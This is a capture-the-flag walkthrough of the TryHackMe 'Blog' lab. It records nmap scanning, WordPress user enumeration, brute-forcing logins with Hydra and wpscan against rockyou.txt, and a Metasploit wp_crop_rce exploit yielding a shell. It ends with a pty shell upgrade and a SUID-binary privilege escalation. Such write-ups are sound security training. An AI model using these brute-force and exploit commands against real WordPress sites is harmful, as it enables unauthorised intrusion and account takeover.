# CTF Writeup: TryHackMe - Blog [medium]

## Reconnaissance

Upon receiving the target's IP address, I ran an **nmap** scan:

```bash
nmap -sV -sC -Pn 10.10.67.243
```

_Output:_

```

nmap -sV -sC -Pn 10.10.67.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 13:34 IDT
Nmap scan report for 10.10.67.243
Host is up (0.076s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-02T10:35:01
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-10-02T10:35:01+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds
```

  
Note: you need to add `blog.thm` to your `/etc/hosts` file in order to access the webpage.

---

## Enumeration

I first tried going directly to `/wp-login.php` to see if I could identify a registered user. After testing common usernames (admin, Administrator, root, joel, etc.), none were successful.

Exploring the blog further, I eventually found a valid username in the URL:

![Author in URL](https://github.com/user-attachments/assets/bd9ce173-55f2-47e6-a1cf-b80298831e23)

The author name was **bjoel**.  

Back on the login page, I tested `bjoel:test` and confirmed that **bjoel** was indeed a registered user:

![Login Attempt](https://github.com/user-attachments/assets/46998a61-edfe-4d7e-abf0-02a648155105)

---

## Password Attacks

I attempted a brute-force attack with Hydra:

```bash
hydra -l bjoel -P /usr/share/wordlists/rockyou.txt 10.10.67.243 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:S=Location\:.*/wp-admin/"
```

This approach didn’t work as expected, so I switched to **wpscan**.  

Running wpscan revealed:  
- The site theme: `twentytwenty`  
- Another username: **kwheel**  
- WordPress version: **5.0** (already answering two CTF questions)

I also learned wpscan can handle brute force itself:

```bash
wpscan --url http://blog.thm/wp-login.php -U kwheel,bjoel -P /usr/share/wordlists/rockyou.txt
```

Eventually, wpscan cracked **kwheel**’s password, granting me access to the WordPress dashboard. Unfortunately, kwheel was a regular user, offering no direct path forward.

---

## Exploitation

Research showed that WordPress 5.0 is vulnerable to **Path Traversal / Local File Inclusion**, via `wp_crop_rce`. (Reference: [Rapid7 Module](https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce))

I used Metasploit with the module `exploit/multi/http/wp_crop_rce`:

![Metasploit Config](https://github.com/user-attachments/assets/8b0c666a-622f-4e29-a9c2-bae7e754f375)

_Reminder: update LHOST to your VPN IP!_  

Running the exploit landed me a **Meterpreter shell**:

![Meterpreter](https://github.com/user-attachments/assets/994f6656-1b33-431b-8416-173b3ba43c51)

I upgraded the shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then I searched for `user.txt`:

![User Flag Attempt](https://github.com/user-attachments/assets/6c5311ea-eeff-4142-b6c6-d58fbfbb2299)

Cute troll. Time for another approach.

---

## Post-Exploitation & Privilege Escalation

I navigated to `/home/bjoel` and found a file: **Billy_Joel_Termination_May20-2020.pdf**.  
I copied it via SCP to my Kali machine:

![PDF Copy](https://github.com/user-attachments/assets/9e897803-b10e-471c-9b93-6efdfa9b9d40)

The PDF wasn’t useful, so I looked into privilege escalation. I noticed a binary called **checker**:

![Checker Binary](https://github.com/user-attachments/assets/f77da03a-fea2-46dc-bf60-57496bf30a3c)

Running it hinted at an `admin` variable check:

![Checker Output](https://github.com/user-attachments/assets/2d432192-9256-4b0c-bfba-ea9075657820)

I modified the variable, and—success! Root access obtained:

![Root Access](https://github.com/user-attachments/assets/b7581b54-f742-4cc5-867a-b66c37c5f1ea)

---

## Root & Flags

With root privileges, I finally accessed the flags:

![Flags](https://github.com/user-attachments/assets/a97af2b9-b49b-4028-8be7-088b1c21c2dd)

As suspected, the actual `user.txt` flag was only readable by root.  

✅ **Challenge Complete!**

